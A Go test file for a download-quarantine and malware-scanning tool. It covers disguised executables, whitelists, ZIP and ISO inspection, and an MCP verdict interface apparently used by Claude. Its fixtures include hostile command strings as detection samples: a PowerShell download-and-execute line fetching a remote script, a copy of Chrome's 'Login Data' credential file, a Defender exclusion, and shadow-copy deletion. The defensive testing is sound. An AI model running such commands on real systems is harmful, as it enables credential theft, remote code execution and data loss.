package core

import (
	"archive/zip"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

func tempFile(t *testing.T, dir, name string, data []byte) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

// 開發機的檔案系統不一定支援延伸屬性(模擬替代資料流用)
func requireStreams(t *testing.T, dir string) {
	t.Helper()
	p := tempFile(t, dir, ".probe", []byte("x"))
	defer os.Remove(p)
	if WriteStream(p, "probe", []byte("1")) != nil {
		t.Skip("這個檔案系統不支援替代資料流 / 延伸屬性")
	}
}

func zone(host string) []byte {
	return []byte("[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://example.com/page\r\nHostUrl=" + host + "\r\n")
}

func TestPEDisguisedAsImageIsNotWhitelistedByExtension(t *testing.T) {
	dir := t.TempDir()
	pe := make([]byte, 512)
	copy(pe, "MZ")
	p := tempFile(t, dir, "cat.jpg", pe)
	f := Inspect(p)
	if f.Category != CatExecutable || !f.Disguised {
		t.Fatalf("category=%s disguised=%v", f.Category, f.Disguised)
	}
	if m := DefaultWhitelist().Match(f); m != "" {
		t.Fatalf("偽裝的執行檔不該被副檔名白名單放行:%s", m)
	}
	if LocalVerdict(LocalSignals(f, nil)) != Suspicious {
		t.Fatal("偽裝的執行檔應該是可疑")
	}
}

func TestDoubleExtensionIsDeceptive(t *testing.T) {
	for _, name := range []string{"invoice.pdf.exe", "photo.jpg.scr", "報價單.docx.lnk", "a\u202Etxt.exe"} {
		if deceptiveName(name) == "" {
			t.Errorf("%s 應該被當成偽裝檔名", name)
		}
	}
	for _, name := range []string{"setup.exe", "report.pdf", "v1.2.3.zip", "my.app.exe"} {
		if d := deceptiveName(name); d != "" {
			t.Errorf("%s 不該被當成偽裝檔名:%s", name, d)
		}
	}
}

func TestPlainTextDocument(t *testing.T) {
	p := tempFile(t, t.TempDir(), "notes.txt", []byte("hello world\nthis is text\n"))
	f := Inspect(p)
	if f.Category != CatDocument || f.Disguised || f.SHA256 == "" {
		t.Fatalf("%+v", f)
	}
	if len(LocalSignals(f, nil)) != 0 {
		t.Fatal("純文字不該有警訊")
	}
}

func TestTextNamedAsScriptIsScript(t *testing.T) {
	p := tempFile(t, t.TempDir(), "run.bat", []byte("@echo off\r\necho hi\r\n"))
	if f := Inspect(p); f.Category != CatScript {
		t.Fatalf("category=%s", f.Category)
	}
}

func TestIOCFindsWindowsStealerTechniques(t *testing.T) {
	ps := `powershell -w hidden -EncodedCommand AAAA; Add-MpPreference -ExclusionPath C:\Users; ` +
		`IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1'); ` +
		`copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"`
	r := ScanData([]byte(ps))
	for _, needle := range []string{"Add-MpPreference -ExclusionPath", "-EncodedCommand", "Net.WebClient", "Login Data"} {
		if _, ok := r.Hits[needle]; !ok {
			t.Errorf("沒抓到 %s", needle)
		}
	}
	if LocalVerdict(r.Signals) != Suspicious {
		t.Fatal("應該是可疑")
	}
	if len(r.IPs) != 1 || r.IPs[0] != "203.0.113.9" {
		t.Fatalf("ips=%v", r.IPs)
	}
	// Windows 程式的字串是 UTF-16LE
	wide := []byte{}
	for _, c := range "vssadmin delete shadows /all" {
		wide = append(wide, byte(c), 0)
	}
	if _, ok := ScanData(wide).Hits["vssadmin delete shadows"]; !ok {
		t.Fatal("沒抓到 UTF-16 字串")
	}
}

func TestIPFilterSkipsVersionsAndLocal(t *testing.T) {
	for ip, want := range map[string]bool{"1.2.3.4": false, "127.0.0.1": false, "192.168.1.5": false,
		"10.0.0.1": false, "8.8.4.40": true, "45.12.3.200": true} {
		if isInterestingIP(ip) != want {
			t.Errorf("%s → %v", ip, !want)
		}
	}
}

func TestZoneIdentifierParsing(t *testing.T) {
	z, host, ref := ParseZoneIdentifier(zone("https://dl.example.com/x.zip"))
	if z != 3 || host != "https://dl.example.com/x.zip" || ref != "https://example.com/page" {
		t.Fatalf("%d %s %s", z, host, ref)
	}
}

func TestDomainWhitelistMatchesSubdomainsOfDownloadOrReferrer(t *testing.T) {
	w := Whitelist{Domains: []string{"example.com"}}
	f := &FileFacts{HostURL: "https://cdn.download.example.com/a.zip", Category: CatArchive}
	if w.Match(f) == "" {
		t.Fatal("子網域應該命中")
	}
	f = &FileFacts{HostURL: "https://evil.com/a.zip", ReferrerURL: "https://www.example.com/", Category: CatArchive}
	if w.Match(f) == "" {
		t.Fatal("來源網頁應該命中")
	}
	f = &FileFacts{HostURL: "https://notexample.com/a.zip", Category: CatArchive}
	if w.Match(f) != "" {
		t.Fatal("notexample.com 不該命中")
	}
}

func TestPublisherWhitelistNeedsValidSignature(t *testing.T) {
	w := Whitelist{Publishers: []string{"Microsoft Corporation"}}
	sig := &SignatureInfo{Status: SigValid, Publisher: "Microsoft Corporation"}
	f := &FileFacts{Category: CatExecutable, Signature: sig}
	if w.Match(f) == "" {
		t.Fatal("有效簽章應該命中")
	}
	f.Signature = &SignatureInfo{Status: SigUntrusted, Publisher: "Microsoft Corporation"}
	if w.Match(f) != "" {
		t.Fatal("不受信任的簽章不該命中")
	}
	if PublisherFromSubject(`CN="Foo, Inc.", O="Foo, Inc.", L=Paris, C=FR`) != "Foo, Inc." {
		t.Fatal("引號裡的逗號")
	}
	if PublisherFromSubject("CN=Only Name") != "Only Name" {
		t.Fatal("沒有 O= 時用 CN=")
	}
}

func TestSuggestionMustMatchRealFacts(t *testing.T) {
	f := &FileFacts{SHA256: "abc", HostURL: "https://downloads.vendor.com/x.exe",
		Signature: &SignatureInfo{Status: SigValid, Publisher: "Vendor Ltd"}}
	cases := map[WhitelistSuggestion]bool{
		{Kind: KindDomain, Value: "vendor.com"}:    true,
		{Kind: KindDomain, Value: "attacker.com"}:  false,
		{Kind: KindDomain, Value: "com"}:           false,
		{Kind: KindSHA256, Value: "ABC"}:           true,
		{Kind: KindPublisher, Value: "vendor ltd"}: true,
		{Kind: KindPublisher, Value: "Evil Corp"}:  false,
	}
	for s, want := range cases {
		if IsConsistent(s, f) != want {
			t.Errorf("%+v → %v", s, !want)
		}
	}
}

func TestWhitelistToolsAddAndRemove(t *testing.T) {
	file := filepath.Join(t.TempDir(), "whitelist.json")
	tools := &WhitelistTools{File: file}
	if _, err := tools.Call("whitelist_add", map[string]any{"kind": "domain", "value": "https://GitHub.com/x"}); err != nil {
		t.Fatal(err)
	}
	if _, err := tools.Call("whitelist_add", map[string]any{"kind": "extension", "value": ".PDF"}); err != nil {
		t.Fatal(err)
	}
	w := LoadWhitelist(file)
	if len(w.Domains) != 1 || w.Domains[0] != "github.com" || !contains(w.Extensions, "pdf") {
		t.Fatalf("%+v", w)
	}
	_, _ = tools.Call("whitelist_remove", map[string]any{"kind": "domain", "value": "github.com"})
	if len(LoadWhitelist(file).Domains) != 0 {
		t.Fatal("沒移除")
	}
	if _, err := tools.Call("whitelist_add", map[string]any{"kind": "teamID", "value": "X"}); err == nil {
		t.Fatal("未知的 kind 應該報錯")
	}
}

func contains(list []string, v string) bool {
	for _, x := range list {
		if x == v {
			return true
		}
	}
	return false
}

func TestMCPProtocolAndVerdict(t *testing.T) {
	dir := t.TempDir()
	target := tempFile(t, dir, "a.txt", []byte("hello"))
	out := filepath.Join(dir, "verdict.json")
	tools := NewScanTools(target, out, "")
	in := strings.Join([]string{
		`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18"}}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
		`{"jsonrpc":"2.0","id":2,"method":"tools/list"}`,
		`{"jsonrpc":"2.0","id":"x","method":"tools/call","params":{"name":"read_text","arguments":{}}}`,
		`{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"submit_verdict","arguments":{"verdict":"safe","summary":"沒問題","reasons":["純文字"],"whitelist_suggestion":{"kind":"sha256","value":"abc"}}}}`,
		`{"jsonrpc":"2.0","id":5,"method":"nope"}`,
	}, "\n") + "\n"
	var buf strings.Builder
	RunStdio(tools, strings.NewReader(in), &buf)
	lines := strings.Split(strings.TrimSpace(buf.String()), "\n")
	if len(lines) != 5 {
		t.Fatalf("回覆數 %d:%s", len(lines), buf.String())
	}
	var list struct {
		Result struct{ Tools []map[string]any } `json:"result"`
	}
	_ = json.Unmarshal([]byte(lines[1]), &list)
	if len(list.Result.Tools) != 4 {
		t.Fatalf("tools=%d", len(list.Result.Tools))
	}
	if !strings.Contains(lines[2], `"id":"x"`) || !strings.Contains(lines[2], "untrusted_file_data") {
		t.Fatalf("read_text:%s", lines[2])
	}
	if !strings.Contains(lines[4], "-32601") {
		t.Fatal("未知方法應該回錯誤")
	}
	data, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	var v ClaudeVerdict
	_ = json.Unmarshal(data, &v)
	if v.Verdict != Safe || v.Summary != "沒問題" || v.Suggestion == nil || v.Suggestion.Kind != KindSHA256 {
		t.Fatalf("%+v", v)
	}
}

func TestReadTextCannotEscapeTargetFolder(t *testing.T) {
	dir := t.TempDir()
	tempFile(t, dir, "secret.txt", []byte("secret"))
	target := filepath.Join(dir, "pkg")
	tempFile(t, target, "inner.txt", []byte("inner"))
	tools := NewScanTools(target, filepath.Join(dir, "v.json"), "")
	if s, err := tools.ReadText("inner.txt"); err != nil || s != "inner" {
		t.Fatalf("%q %v", s, err)
	}
	if _, err := tools.ReadText("../secret.txt"); err == nil {
		t.Fatal("不能讀到目標外面")
	}
}

func TestZipListingReadAndNestedShortcut(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "invoice.zip")
	fh, _ := os.Create(p)
	zw := zip.NewWriter(fh)
	w, _ := zw.Create("Invoice.pdf.lnk")
	lnk := append([]byte("L\x00\x00\x00\x01\x14\x02\x00"), []byte(" powershell -w hidden -EncodedCommand AAAA")...)
	w.Write(lnk)
	w, _ = zw.Create("readme.txt")
	w.Write([]byte("hello"))
	zw.Close()
	fh.Close()

	f := Inspect(p)
	if f.Category != CatArchive || len(f.Contents) != 2 {
		t.Fatalf("%+v", f)
	}
	ioc := ScanPath(p, f)
	if _, ok := ioc.Hits["-EncodedCommand"]; !ok {
		t.Fatalf("沒掃到壓縮檔裡的捷徑:%+v", ioc)
	}
	if LocalVerdict(LocalSignals(f, ioc)) != Suspicious {
		t.Fatal("ZIP 裡夾帶捷徑應該是可疑")
	}
	tools := NewScanTools(p, filepath.Join(dir, "v.json"), "")
	if s, err := tools.ReadText("readme.txt"); err != nil || s != "hello" {
		t.Fatalf("%q %v", s, err)
	}
}

// 手工做一個最小的 ISO 9660 + Joliet 映像
func TestISOListing(t *testing.T) {
	img := make([]byte, 24*2048)
	pvd := img[16*2048:]
	pvd[0] = 1
	copy(pvd[1:], "CD001")
	svd := img[17*2048:]
	svd[0] = 2
	copy(svd[1:], "CD001")
	copy(svd[88:], "%/E")
	img[18*2048] = 255
	copy(img[18*2048+1:], "CD001")

	dirRec := func(name []byte, extent, size uint32, isDir bool) []byte {
		n := 33 + len(name)
		if n%2 == 1 {
			n++
		}
		r := make([]byte, n)
		r[0] = byte(n)
		putLE(r[2:], extent)
		putLE(r[10:], size)
		if isDir {
			r[25] = 2
		}
		r[32] = byte(len(name))
		copy(r[33:], name)
		return r
	}
	ucs := func(s string) []byte {
		var b []byte
		for _, c := range s {
			b = append(b, byte(c>>8), byte(c))
		}
		return b
	}
	root := append(dirRec([]byte{0}, 20, 2048, true), dirRec([]byte{1}, 20, 2048, true)...)
	root = append(root, dirRec(ucs("文件.pdf.lnk;1"), 21, 13, false)...)
	copy(img[20*2048:], root)
	copy(img[21*2048:], "L\x00\x00\x00\x01\x14\x02\x00mshta")
	rootRec := dirRec([]byte{0}, 20, 2048, true)
	copy(pvd[156:], rootRec)
	copy(svd[156:], rootRec)

	p := tempFile(t, t.TempDir(), "doc.iso", img)
	f := Inspect(p)
	if f.Category != CatDiskImage || len(f.Contents) != 1 || f.Contents[0] != "文件.pdf.lnk" {
		t.Fatalf("%+v", f)
	}
	if LocalVerdict(LocalSignals(f, nil)) != Suspicious {
		t.Fatal("ISO 裡只有捷徑應該是可疑")
	}
	tools := NewScanTools(p, filepath.Join(t.TempDir(), "v.json"), "")
	if s, err := tools.ReadText("文件.pdf.lnk"); err != nil || !strings.HasSuffix(s, "mshta") {
		t.Fatalf("%q %v", s, err)
	}
}

func putLE(b []byte, v uint32) {
	b[0], b[1], b[2], b[3] = byte(v), byte(v>>8), byte(v>>16), byte(v>>24)
}

func TestReleaseGoesBackToOriginFolderAndAvoidsNameClash(t *testing.T) {
	root := t.TempDir()
	requireStreams(t, root)
	holding := filepath.Join(root, "holding")
	origin := filepath.Join(root, "Projects")
	p := tempFile(t, origin, "tool.exe", []byte("MZ"))
	held, err := Admit(p, holding)
	if err != nil || Origin(held) != origin {
		t.Fatalf("%v %q", err, Origin(held))
	}
	tempFile(t, origin, "tool.exe", []byte("other"))
	dest, err := Release(held, filepath.Join(root, "Downloads"))
	if err != nil {
		t.Fatal(err)
	}
	if dest != filepath.Join(origin, "tool (2).exe") || !IsReleased(dest) || Origin(dest) != "" {
		t.Fatalf("dest=%s released=%v", dest, IsReleased(dest))
	}
}

func TestReleaseFallsBackWhenOriginFolderIsGone(t *testing.T) {
	root := t.TempDir()
	requireStreams(t, root)
	origin := filepath.Join(root, "Temp1")
	p := tempFile(t, origin, "a.zip", []byte("PK"))
	held, _ := Admit(p, filepath.Join(root, "holding"))
	os.RemoveAll(origin)
	dest, err := Release(held, filepath.Join(root, "Downloads"))
	if err != nil || filepath.Dir(dest) != filepath.Join(root, "Downloads") {
		t.Fatalf("%s %v", dest, err)
	}
}

func TestFreshDownloadNeedsZoneAndWebSource(t *testing.T) {
	dir := t.TempDir()
	requireStreams(t, dir)
	now := time.Now()
	p := tempFile(t, dir, "a.exe", []byte("MZ"))
	if IsFreshDownload(p, 15*time.Minute, now) {
		t.Fatal("沒有下載標記")
	}
	_ = WriteStream(p, ZoneStream, []byte("[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=C:\\Users\\me\\Downloads\\x.zip\r\n"))
	if IsFreshDownload(p, 15*time.Minute, now) {
		t.Fatal("從 ZIP 解壓縮出來的不算")
	}
	_ = WriteStream(p, ZoneStream, zone("https://example.com/a.exe"))
	if !IsFreshDownload(p, 15*time.Minute, now) {
		t.Fatal("應該是新下載")
	}
	if IsFreshDownload(p, 15*time.Minute, now.Add(time.Hour)) {
		t.Fatal("太舊了")
	}
	_ = WriteStream(p, ReleasedStream, []byte("1"))
	if IsFreshDownload(p, 15*time.Minute, now) {
		t.Fatal("已放行過")
	}
}

func TestInterceptorCandidateRules(t *testing.T) {
	root := t.TempDir()
	ic := NewInterceptor(root, []string{filepath.Join(root, "小黑屋")}, nil)
	ok := tempFile(t, root, filepath.Join("Desktop", "a.exe"), nil)
	if !ic.Candidate(ok) {
		t.Fatal("一般資料夾的檔案應該處理")
	}
	for _, rel := range []string{
		filepath.Join("小黑屋", "a.exe"), filepath.Join("AppData", "Local", "x.exe"),
		filepath.Join("code", "node_modules", "x.js"), filepath.Join(".cache", "a"),
		filepath.Join("Downloads", "a.exe.crdownload"), filepath.Join("Downloads", "~$doc.docx"),
	} {
		if ic.Candidate(tempFile(t, root, rel, nil)) {
			t.Errorf("%s 應該略過", rel)
		}
	}
}

func TestInterceptorCatchesDownloadSavedToAnyFolder(t *testing.T) {
	root := t.TempDir()
	requireStreams(t, root)
	var mu sync.Mutex
	var got []string
	ic := NewInterceptor(root, nil, func(p string) { mu.Lock(); got = append(got, p); mu.Unlock() })
	if err := ic.Start(); err != nil {
		t.Fatal(err)
	}
	defer ic.Stop()
	time.Sleep(300 * time.Millisecond)
	old := tempFile(t, root, filepath.Join("Work", "plain.txt"), []byte("x"))
	_ = old
	p := tempFile(t, root, filepath.Join("Work", "setup.exe"), []byte("MZ"))
	_ = WriteStream(p, ZoneStream, zone("https://example.com/setup.exe"))
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		mu.Lock()
		n := len(got)
		mu.Unlock()
		if n > 0 {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(got) != 1 || got[0] != p {
		t.Fatalf("got=%v", got)
	}
}

func TestWatcherIgnoresTemporaryDownloadsAndReportsFinishedFile(t *testing.T) {
	dir := t.TempDir()
	var mu sync.Mutex
	var got []string
	w := NewDirWatcher(dir, func(p string) { mu.Lock(); got = append(got, filepath.Base(p)); mu.Unlock() })
	w.Delay = 300 * time.Millisecond
	if err := w.Start(false); err != nil {
		t.Fatal(err)
	}
	defer w.Stop()
	tmp := tempFile(t, dir, "big.zip.crdownload", []byte("part"))
	time.Sleep(500 * time.Millisecond)
	_ = os.Rename(tmp, filepath.Join(dir, "big.zip"))
	time.Sleep(1500 * time.Millisecond)
	mu.Lock()
	defer mu.Unlock()
	if len(got) != 1 || got[0] != "big.zip" {
		t.Fatalf("got=%v", got)
	}
}
